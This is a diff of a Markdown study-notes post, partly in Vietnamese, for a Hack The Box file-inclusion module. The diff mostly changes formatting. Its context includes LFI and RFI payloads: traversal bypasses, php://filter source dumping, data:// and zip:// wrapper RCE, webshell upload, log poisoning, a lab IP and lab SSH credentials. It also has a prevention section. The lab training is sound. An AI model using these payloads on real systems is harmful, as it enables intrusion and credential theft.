@@ -3,14 +3,18 @@ title: "Module 16: File Inclusion"
 date: 2026-07-07 14:04:51 +0700
 categories: [hack-the-box, web-penetration-tester-path]
 tags: [ctf-challenges, red-team, htb, cwes]
+render_with_liquid: false
 ---
 
 Useful command
-```shell
-curl -s 'http://154.57.164.76:30421/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' -o /tmp/resp.html 
+
+```bash
+curl -s 'http://154.57.164.76:30421/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' -o /tmp/resp.html
 cat /tmp/resp.html | grep -oP '[A-Za-z0-9+/=]{100,}' | head -5
 ```
+
 ## SECTION 1: Introduction
+
 ### 1. Bản chất lỗ hổng
 
 LFI xảy ra khi ứng dụng dùng **user-controlled parameter** để load file động mà **không sanitize input** — phổ biến nhất ở templating engine (`?page=about`, `?language=en`).
@@ -28,7 +32,7 @@ LFI xảy ra khi ứng dụng dùng **user-controlled parameter** để load fil
 
 ### 3. Phân biệt Read vs Execute
 
-```
+```text
 Read only  → Leak source code, credentials, config files
 Execute    → RCE (kết hợp log poisoning, php wrapper, v.v.)
 Remote URL → RFI (Remote File Inclusion) nếu server cho phép
@@ -38,7 +42,7 @@ Remote URL → RFI (Remote File Inclusion) nếu server cho phép
 
 ### 4. Impact theo cấp độ
 
-```
+```text
 LFI (read)   → source code leak → credentials → pivot
 LFI (exec)   → RCE → full backend compromise
 RFI (exec)   → load webshell từ attacker-controlled server
@@ -83,6 +87,7 @@ List function and their ability
 |`@Html.RemotePartial()`|✅|❌|✅|
 |`Response.WriteFile()`|✅|❌|❌|
 |`include`|✅|✅|✅|
+
 ## SECTION 2: Local File Inclusion
 
 ### 1. Basic LFI
@@ -93,7 +98,7 @@ Input trực tiếp vào `include()` không có gì thêm vào:
 include($_GET['language']);  // vulnerable
 ```
 
-```
+```text
 ?language=/etc/passwd          # Linux
 ?language=C:\Windows\boot.ini  # Windows
 ```
@@ -108,7 +113,7 @@ Server prepend directory vào input:
 include("./languages/" . $_GET['language']);
 ```
 
-```
+```text
 ?language=../../../../etc/passwd
 # Luôn thêm nhiều ../ hơn cần — nếu đã ở / thì không bị break
 # Tính nhanh: /var/www/html/ → 3 tầng → ../../../
@@ -129,7 +134,7 @@ include("lang_" . $_GET['language']);
 
 Fix bằng cách prefix `/`:
 
-```
+```text
 ?language=/../../../etc/passwd
 # → lang_/ treated as dir → traverse bình thường ✅
 ```
@@ -155,7 +160,7 @@ include($_GET['language'] . ".php");
 
 Không exploit trực tiếp qua parameter — **poison dữ liệu vào DB trước**, function khác sẽ trigger:
 
-```
+```text
 [Register] username = ../../../etc/passwd
            ↓
 [Avatar load] /profile/../../../etc/passwd/avatar.png
@@ -179,8 +184,9 @@ Không exploit trực tiếp qua parameter — **poison dữ liệu vào DB trư
 #### Question 1
 
 Using the file inclusion find the name of a user on the system that starts with "b".
-  
+
 Access the page
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-bb70f069dd7ac2a23edbfbec188fb678.png)
 
 Finding attack surfaces
@@ -192,9 +198,13 @@ Confirm the LFI
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-5e64f29aa32ba3dae57c767abacc2de0.png)
 
 Identify the user that start with b
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-c15d9ce602a5d7a426bde0ec012a081a.png)
+
 #### Question 2
+
 Submit the contents of the flag.txt file located in the /usr/share/flags directory.
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-988eb149be33f6b11fb976509169d796.png)
 
 ## SECTION 3: Basic Bypasses
@@ -208,7 +218,7 @@ $language = str_replace('../', '', $_GET['language']);
 # ....// → remove ../ → còn lại ../  ✅
 ```
 
-```
+```text
 # Các dạng bypass:
 ....//....//....//etc/passwd
 ..././..././..././etc/passwd
@@ -222,7 +232,7 @@ $language = str_replace('../', '', $_GET['language']);
 
 Filter chặn ký tự `.` và `/` → encode toàn bộ:
 
-```
+```text
 ../  →  %2e%2e%2f
 ../../../../etc/passwd  →  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 
@@ -243,7 +253,7 @@ Server dùng `preg_match` kiểm tra path phải bắt đầu bằng `./language
 if(preg_match('/^\.\/languages\/.+$/', $_GET['language']))
 ```
 
-```
+```text
 # Start với approved path rồi traverse ra ngoài:
 ?language=./languages/../../../../etc/passwd
 
@@ -269,7 +279,7 @@ echo -n "non_existing_dir/../../../etc/passwd/" && for i in {1..2048}; do echo -
 
 #### Null Byte — PHP < 5.5
 
-```
+```text
 ?language=../../../../etc/passwd%00
 # Path thực tế: /etc/passwd%00.php → truncate tại null byte → /etc/passwd ✅
 ```
@@ -286,11 +296,13 @@ echo -n "non_existing_dir/../../../etc/passwd/" && for i in {1..2048}; do echo -
 |Append `.php` (PHP < 5.3)|Path truncation 4096 chars|
 |Append `.php` (PHP < 5.5)|Null byte `%00`|
 |Kết hợp nhiều filter|Chain: approved path + encode|
-  
 
 #### Question 1
+
 The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a69f8ce1db719cc35f4cf44ac9864773.png)
+
 ## SECTION 4: PHP Filters
 
 ### 1. Tại sao cần PHP Wrappers?
@@ -301,7 +313,7 @@ LFI thông thường với file `.php` → server **execute** file thay vì hi�
 
 ### 2. Cú pháp php://filter
 
-```
+```text
 php://filter/read=<filter>/resource=<file>
 ```
 
@@ -314,7 +326,7 @@ php://filter/read=<filter>/resource=<file>
 
 ### 3. Source Code Disclosure — Base64 Filter
 
-```
+```text
 # Đọc config.php (server tự append .php):
 ?language=php://filter/read=convert.base64-encode/resource=config
 
@@ -362,7 +374,7 @@ grep -Ei "(password|passwd|secret|key|db_|api_)" leaked_*.php
 
 ## 5. Các filter hữu ích khác
 
-```
+```text
 # String filters
 php://filter/read=string.rot13/resource=config
 
@@ -379,7 +391,7 @@ python3 -c "import zlib,base64; print(zlib.decompress(base64.b64decode('...')))"
 
 ### 6. Tóm tắt attack path
 
-```
+```text
 LFI found
     ↓
 php://filter/base64-encode → dump .php source
@@ -394,9 +406,15 @@ Nếu tìm được upload endpoint / log path → leo thang RCE
 #### Question 1
 
 Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer.
-using ffuf to find other script that existed on the server 
-![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a6841a7ec8522c07e9235af5343bac36.png)Read the configure.php
-![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-b218acd524b495bac9d3ea243f13255d.png)![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a101f44f07751f39806460500d28a020.png)
+using ffuf to find other script that existed on the server
+
+![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a6841a7ec8522c07e9235af5343bac36.png)
+
+Read the configure.php
+
+![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-b218acd524b495bac9d3ea243f13255d.png)
+
+![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a101f44f07751f39806460500d28a020.png)
 
 ## SECTION 5: PHP WRAPPER
 
@@ -503,13 +521,16 @@ curl -s "http://TARGET/index.php?language=data://text/plain;base64,$ENCODED"
 ```
 
 Question 1
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-c6942e3273282b4c5b9923ff09f8b946.png)
 
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-95d9422eb1bd64e1ad60ee00e6c29d93.png)
 
 Check for flag
 
-![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-6180a56cef335a62429e4594ac826227.png)![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a82510d5014352175c914e8b04998f80.png)
+![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-6180a56cef335a62429e4594ac826227.png)
+
+![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a82510d5014352175c914e8b04998f80.png)
 
 ## SECTION 6: Remote File Inclusion (RFI)
 
@@ -533,7 +554,7 @@ Check for flag
 
 ### 2. Verify RFI
 
-```
+```text
 # Test bằng localhost trước — tránh bị firewall block:
 ?language=http://127.0.0.1:80/index.php
 ```
@@ -598,7 +619,7 @@ impacket-smbserver -smb2support share $(pwd)
 
 ### 6. Attack Decision Tree
 
-```
+```text
 LFI found
     ↓
 Check allow_url_include = On?
@@ -613,25 +634,30 @@ Check allow_url_include = On?
 
 Nếu hàm **không execute** (chỉ read remote URL) → vẫn khai thác được qua SSRF:
 
-```
+```text
 ?language=http://127.0.0.1:8080/admin
 ?language=http://127.0.0.1:3000/internal-api
 # Enumerate internal ports/services
 ```
-  
+
 #### Question 1
 
 Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /
 Confirm that the page got LFI
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-2040292bfbf5b6f1fc60a2bd2acaa23c.png)
+
 Confirm RFI
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-8b8c7eda210561192a70f41b0f0535d9.png)
 
 Get the flag
 
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-8b590728a3dfda62510d12362fc9c0d3.png)
+
 ## SECTION 7: LFI and File Uploads
-#### Điều kiện
+
+### Điều kiện
 
 - Upload form **không cần** vulnerable — chỉ cần cho phép upload
 - Hàm LFI phải có **Execute** capability (`include()`, `require()`, `res.render()`, v.v.)
@@ -673,7 +699,7 @@ zip shell.jpg shell.php
 ?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
 ```
 
-> ⚠️ `zip://` không enabled mặc định — fallback nếu method 1 fail  
+> ⚠️ `zip://` không enabled mặc định — fallback nếu method 1 fail
 > ⚠️ Một số upload form vẫn detect zip qua content-type dù đổi tên
 
 ---
@@ -732,7 +758,7 @@ ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt:FUZZ \
 
 ### 6. Attack Flow
 
-```
+```text
 Upload form tồn tại?
     ↓
 Upload GIF8 + webshell → tìm path từ page source / fuzz
@@ -741,18 +767,24 @@ LFI include path → RCE
     ↓
 Fail? → thử zip:// → thử phar://
 ```
+
 #### Question 1
+
 Use any of the techniques covered in this section to gain RCE and read the flag at /
 Create malicious file gif.
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-6e29375900c6f5ce339dc516b6465a49.png)
 
 Upload it
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-4d5f6fcce500895dff18e07822b21948.png)
 
 Using LFI to execute the shell
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-25f5f30d05f4c9510a6ad6de10607541.png)
 
 Get the flag
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-b8ada3c1c1edde460ae96baf66f4851f.png)
 
 ## SECTION 8: Log Poisoning
@@ -886,7 +918,7 @@ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:FUZZ \
 
 ### 6. Attack Decision Tree
 
-```
+```text
 LFI + Execute confirmed
         ↓
 Đọc được /var/log/apache2/access.log?
@@ -901,31 +933,39 @@ Có upload form?
 ```
 
 #### Question 1
+
 Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd
 
 php session poisoning
 
 Confirm that we can access to the session file
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-646e3472cf49ea38fd13d1e28299e30f.png)
 
 Poison the languages parameter with php shell
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-7eb319f2a8a5081acd5ce06fb51fb2df.png)
 
 access the session file again to get the command result
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-e2a88d305d48a0f78089f204441ea25f.png)
 
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-1794f9142f79fb5e92d44dfd9a7260e1.png)
 
 #### Question 2
+
 Try to use a different technique to gain RCE and read the flag at /
 Log poisoning
 Check that if we can access to webserver's log files
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-1e7dafe86412a808fd4a2723cc2b3131.png)
 
 Send payload with poisoned user-agent
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-1a57325b7db8986ae8ef037e6893c6b9.png)
 
 Access and get the flag
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-0dc3e867c40fa09322fab20ddd04fe98.png)
 
 ## SECTION 9: Automated Scanning
@@ -1073,7 +1113,7 @@ bash
 
 ### 8. Workflow Tổng hợp
 
-```
+```text
 Tìm thấy LFI parameter
         ↓
 Fuzz hidden params → burp-parameter-names.txt
@@ -1089,16 +1129,19 @@ Fuzz logs/config → LFI-WordList-Linux
 Log Poisoning / Session Poisoning / Upload + Include → RCE
 ```
 
-  
-
 #### Question 1
+
 Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt
 Fuzzing parameter
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-2daef8d22c9d5fd8e7dbd133c74131cd.png)
+
 Testing it
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-f57a84c9d0fbebfb64945a7f4a26e471.png)
 
 Testing for lfi
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-83a62377142077624aa319a53045fbae.png)
 
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-1f28a31b0a359720eb0cb4cbe89c5595.png)
@@ -1108,6 +1151,7 @@ Get flag
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-a52363958c9b9b087df6b0cfe453620e.png)
 
 ## SECTION 10: File Inclusions prevention
+
 ### 1. Nguyên tắc cốt lõi
 
 **Không bao giờ** đưa user-controlled input trực tiếp vào file inclusion functions (`include()`, `require()`, `file_get_contents()`, v.v.).
@@ -1160,13 +1204,13 @@ while(substr_count($input, '../', 0)) {
 ```
 
 > ⚠️ **Edge case quan trọng:** Bash cho phép wildcard `?` và `*` thay thế `.` trong path traversal:
-> 
+>
 > bash
-> 
+>
 > ```bash
 > cat .?/.*/.?/etc/passwd   # hoạt động trên Bash ✅
 > ```
-> 
+>
 > PHP thuần không bị — nhưng nếu PHP gọi `system()` → Bash execute → bypass xảy ra. Dùng native framework function để được community patch edge case này.
 
 ---
@@ -1202,7 +1246,7 @@ docker run --read-only -v /var/www/html:/var/www/html myapp
 
 ### 5. WAF — ModSecurity
 
-```
+```text
 Permissive mode (Detection only)
     → Log các request bị flag
     → Tune rules → loại bỏ false positive
@@ -1242,34 +1286,46 @@ Theo FireEye M-Trends 2020: thời gian trung bình phát hiện breach là **30
 
 #### Question 1
 
-What is the full path to the php.ini file for Apache? SSH to 10.129.29.112 (ACADEMY-LFI-HARDEN), with user "htb-student" and password "HTB_@cademy_stdnt!" 
+What is the full path to the php.ini file for Apache? SSH to 10.129.29.112 (ACADEMY-LFI-HARDEN), with user "htb-student" and password "HTB_@cademy_stdnt!"
 
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-9daeed74c901ec1d825403c2d59939df.png)
 
 #### Question 2
+
 Edit the php.ini file to block system(), then try to execute PHP Code that uses system. Read the /var/log/apache2/error.log file and fill in the blank: system() has been disabled for ________ reasons.
 Add system to disable function
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-9177fdbbcaeb578bd6299bc2996c127b.png)
 
 Create shell php using system()
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-531faa0048192409ed3f12b3474a6440.png)
+
 Restart apache2
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-87b460fb613558ef03f35eedc45ec5a7.png)
 
 Access through web
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-082d7697670c88769d049b5b5e4743a2.png)
 
 Check log
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-6c0ab6fa2be092a86c7cc03155bde9eb.png)
 
 ## SECTION 11: Skills Assessment - File Inclusion
 
-You have been contracted by `Sumace Consulting Gmbh` to carry out a web application penetration test against their main website. During the kickoff meeting, the CISO mentioned that last year's penetration test resulted in zero findings, however they have added a job application form since then, and so it may be a point of interest.
-####  Question 1
+You have been contracted by `Sumace Consulting Gmbh` to carry out a web application penetration test against their main website. During the kickoff meeting, the CISO mentioned that last year's penetration test resulted in zero findings, however they have added a job application form since then, and so it may be a point of interest.
+
+### Question 1
+
 Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
 Access the page
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-dc9ecd4e85382146de0458e2c05662c9.png)
+
 Navigate through page source, identify interesting api
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-17b5087e4de2fa8ba6e234e51bacb0f8.png)
 
 Check the api
@@ -1277,12 +1333,15 @@ Check the api
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-3c8d21fde06e37f26cbd21ae26a1c3b3.png)
 
 Trying to fuzzing with p parameter some suspicious result returned
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-8267a814fb673fec543239f909e49ccf.png)
 
 Confirm LFI
 
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-652b4aadf46870c3c45bafa962f0f185.png)
+
 Keep identify, upload apply, can upload a shell to server. But cannot identify directory that the shell come in. Start to brute force i find config files
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-cfe9de1e92293c97058d2bc37f0fde28.png)
 
 Check access log, then try to use LFI log poisoning but failed.
@@ -1290,6 +1349,7 @@ Check access log, then try to use LFI log poisoning but failed.
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-e4c904a0469fc56384ec26d4172925bd.png)
 
 Check config files, identify the uploads directory
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-02a4af0f3729ab69bd94ba361d8e6704.png)
 
 Checking api/image.php, found that the function in use is file_get_contents() which is can read file only
@@ -1297,16 +1357,21 @@ Checking api/image.php, found that the function in use is file_get_contents() wh
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-2b86b9098fe8a5bf2b57dbe486bd6a6f.png)
 
 When checking apply.php i found api/application.php
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-54dae38855ce61b797a156951a48c973.png)
 
 We can confirm that the file uploads position
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-5b1f6e2ade7aca48d1701aa511516409.png)
 
 Check our shell
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-26399f9952d09b3c2c86d26370d257d1.png)
 
 Checking the contact.php, found an secret parameter.
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-d0ddcff3042e22c39c4c7f01938db214.png)
 
 Exploit it and get the flag
+
 ![](/assets/img/module-16-file-inclusion/module-16-file-inclusion-afc09b54d9d15fd055a1f7471240497a.png)
